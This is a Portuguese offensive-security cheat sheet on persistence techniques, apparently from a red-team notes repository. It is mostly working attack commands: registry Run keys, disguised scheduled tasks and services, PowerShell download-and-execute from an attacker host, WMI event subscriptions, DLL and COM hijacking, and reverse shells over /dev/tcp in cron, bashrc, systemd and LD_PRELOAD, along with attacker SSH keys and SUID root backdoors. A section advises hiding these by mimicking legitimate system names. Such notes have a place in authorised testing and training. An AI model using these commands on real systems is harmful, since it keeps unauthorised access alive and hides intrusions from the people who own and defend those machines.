# Técnicas de Persistência

## Índice

- [Persistência no Windows](#persistência-no-windows)
  - [Chaves de Registro Run](#chaves-de-registro-run)
  - [Tarefas Agendadas](#tarefas-agendadas)
  - [Serviços](#serviços)
  - [Pasta de Inicialização](#pasta-de-inicialização)
  - [Assinaturas de Eventos WMI](#assinaturas-de-eventos-wmi)
  - [Persistência via DLL Hijacking](#persistência-via-dll-hijacking)
  - [COM Hijacking](#com-hijacking)
- [Persistência no Linux](#persistência-no-linux)
  - [Cron Jobs](#cron-jobs)
  - [Chaves SSH](#chaves-ssh)
  - [Serviços Systemd](#serviços-systemd)
  - [Bashrc/Profile](#bashrcprofile)
  - [Binário SUID](#binário-suid)
  - [LD_PRELOAD](#ld_preload)
- [Dicas de Evasão de Detecção](#dicas-de-evasão-de-detecção)
- [Veja Também](#veja-também)

---

## Persistência no Windows

### Verificação Rápida (One-liner)

```powershell
# Verificar locais comuns de persistência
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run && reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run && schtasks /query /fo LIST /v | findstr /i "TaskName Status"
```

### Chaves de Registro Run

> Executar payload no login do usuário

```cmd
:: Usuário atual (HKCU)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f

:: Máquina local (HKLM) - requer admin
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f

:: RunOnce (executa uma vez e deleta a chave)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```

#### Persistência via Registro com PowerShell

```powershell
# Definir persistência no registro
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\Windows\Temp\shell.exe"

# Com payload PowerShell
$payload = "powershell -ep bypass -w hidden -e <BASE64>"
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value $payload
```

#### Outros Locais de Registro

| Local | Descrição |
|-------|-----------|
| `HKCU\...\Run` | Login do usuário atual |
| `HKLM\...\Run` | Login de todos os usuários (admin) |
| `HKCU\...\RunOnce` | Executa uma vez no login |
| `HKLM\...\RunOnce` | Executa uma vez para todos os usuários |
| `HKLM\...\RunServices` | Antes do login do usuário (legado) |
| `HKCU\...\Explorer\Shell Folders\Startup` | Caminho da pasta de inicialização |
| `HKLM\SYSTEM\CurrentControlSet\Services\<nome>` | Persistência via serviço |

---

### Tarefas Agendadas

```cmd
:: Criar tarefa agendada (executa no logon)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc ONLOGON /ru SYSTEM

:: Criar tarefa agendada (executa a cada hora)
schtasks /create /tn "Maintenance" /tr "C:\Windows\Temp\shell.exe" /sc HOURLY /mo 1 /ru SYSTEM

:: Criar tarefa agendada (executa na inicialização)
schtasks /create /tn "Startup" /tr "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')" /sc ONSTART /ru SYSTEM

:: Ocultar tarefa com descritor de segurança
schtasks /create /tn "\Microsoft\Windows\Maintenance\Cleanup" /tr "C:\Windows\Temp\shell.exe" /sc DAILY /st 02:00 /ru SYSTEM
```

#### Tarefa Agendada via PowerShell

```powershell
# Criar tarefa agendada oculta
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1'))"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Principal $principal

# Listar tarefas agendadas
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,TaskPath
```

---

### Serviços

```cmd
:: Criar serviço malicioso
sc create "WindowsUpdate" binpath= "C:\Windows\Temp\shell.exe" start= auto obj= LocalSystem DisplayName= "Windows Update Service"

:: Iniciar serviço
sc start WindowsUpdate

:: Consultar serviço
sc query WindowsUpdate

:: Deletar serviço
sc delete WindowsUpdate
```

#### Criação de Serviço via PowerShell

```powershell
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\Windows\Temp\shell.exe" -DisplayName "Windows Update Service" -StartupType Automatic -Description "Provides Windows Updates"
Start-Service -Name "WindowsUpdate"
```

---

### Pasta de Inicialização

```cmd
:: Pasta de inicialização do usuário atual
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe"

:: Pasta de inicialização de todos os usuários (admin)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe"
```

```powershell
# PowerShell
Copy-Item shell.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

### Assinaturas de Eventos WMI

> Sobrevive a reinicializações, executa como SYSTEM

```powershell
# Criar assinatura de evento WMI
$filterName = "ProcessCreatedFilter"
$consumerName = "ProcessCreatedConsumer"
$command = "powershell -ep bypass -w hidden -e <BASE64_PAYLOAD>"

# Filtro de Evento (dispara na criação de qualquer processo)
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = $filterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'notepad.exe'"
}

# Consumer do Evento (ação a executar)
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $command
}

# Vincular filtro e consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

#### Remover Persistência WMI

```powershell
# Remover assinatura WMI
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='ProcessCreatedFilter'" | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='ProcessCreatedConsumer'" | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -match 'ProcessCreatedFilter'} | Remove-WmiObject
```

---

### Persistência via DLL Hijacking

```cmd
:: Encontrar ordem de busca de DLL vulnerável
:: Copiar DLL maliciosa para o diretório da aplicação
copy malicious.dll "C:\Program Files\VulnApp\version.dll"

:: DLLs comuns passíveis de hijacking:
:: - version.dll
:: - userenv.dll
:: - dbghelp.dll
```

---

### COM Hijacking

```cmd
:: COM hijack via registro
reg add "HKCU\SOFTWARE\Classes\CLSID\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\InProcServer32" /ve /t REG_SZ /d "C:\Windows\Temp\evil.dll" /f
reg add "HKCU\SOFTWARE\Classes\CLSID\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\InProcServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
```

---

## Persistência no Linux

### Verificação Rápida (One-liner)

```shell
# Verificar locais comuns de persistência
cat /etc/crontab /etc/cron.d/* 2>/dev/null; cat ~/.bashrc ~/.profile 2>/dev/null | grep -v "^#"; find /etc/systemd/system -name "*.service" -type f 2>/dev/null
```

### Cron Jobs

```shell
# Crontab do usuário (executa como usuário atual)
(crontab -l 2>/dev/null; echo "* * * * * /tmp/shell.sh") | crontab -

# Crontab do sistema (requer root)
echo "* * * * * root /tmp/shell.sh" >> /etc/crontab

# Diretório cron.d (requer root)
echo "* * * * * root /tmp/shell.sh" > /etc/cron.d/backdoor

# A cada reinicialização
echo "@reboot root /tmp/shell.sh" >> /etc/crontab
```

#### Cron Job com Reverse Shell

```shell
# Adicionar reverse shell ao crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'") | crontab -
```

---

### Chaves SSH

```shell
# Adicionar chave pública do atacante ao authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@kali" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Para acesso root (como root)
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@kali" >> /root/.ssh/authorized_keys
```

---

### Serviços Systemd

```shell
# Criar serviço malicioso (requer root)
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Habilitar e iniciar serviço
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

---

### Bashrc/Profile

```shell
# Adicionar ao bashrc do usuário (executa em novo terminal)
echo '/bin/bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1 &"' >> ~/.bashrc

# Adicionar ao profile (executa no login)
echo '/bin/bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1 &"' >> ~/.profile

# Sistema inteiro (requer root)
echo '/bin/bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1 &"' >> /etc/profile
```

---

### Binário SUID

```shell
# Copiar bash e definir SUID (requer root)
cp /bin/bash /tmp/.hidden_bash
chmod u+s /tmp/.hidden_bash

# Executar com -p para obter root
/tmp/.hidden_bash -p

# Criar wrapper C com SUID
cat > /tmp/suid.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc /tmp/suid.c -o /tmp/.backdoor
chmod u+s /tmp/.backdoor
```

---

### LD_PRELOAD

```c
// preload.c - compilar e definir como LD_PRELOAD
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'");
}
```

```shell
# Compilar
gcc -shared -fPIC -o /tmp/.preload.so preload.c

# Adicionar ao ld.so.preload (requer root)
echo "/tmp/.preload.so" >> /etc/ld.so.preload
```

---

## Dicas de Evasão de Detecção

### Windows

| Técnica | Evasão |
|---------|--------|
| Chaves de registro | Usar locais incomuns, ofuscar nomes |
| Tarefas agendadas | Nomear como tarefas legítimas do Windows |
| Serviços | Usar nomes e descrições que pareçam legítimos |
| WMI | Se mistura com atividade WMI normal |
| Pasta de inicialização | Renomear executável para parecer legítimo |

### Linux

| Técnica | Evasão |
|---------|--------|
| Cron jobs | Usar `/etc/cron.d/` com nomes similares a serviços do sistema |
| Systemd | Nomear serviço igual a um serviço do sistema |
| Chaves SSH | Menos óbvio se já existirem múltiplas chaves |
| Bashrc | Esconder no meio do arquivo com ofuscação |
| SUID | Usar nomes de arquivos ocultos (`.`) |

---

## Veja Também

- **[Movimento Lateral](Lateral-Movement.md)** - Mover-se entre máquinas
- **[Escalação de Privilégios Windows](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Escalar antes de persistir
- **[Escalação de Privilégios Linux](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Técnicas de privesc no Linux
- **[Exploração de AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** - Persistência específica de AD (Golden Ticket, etc.)
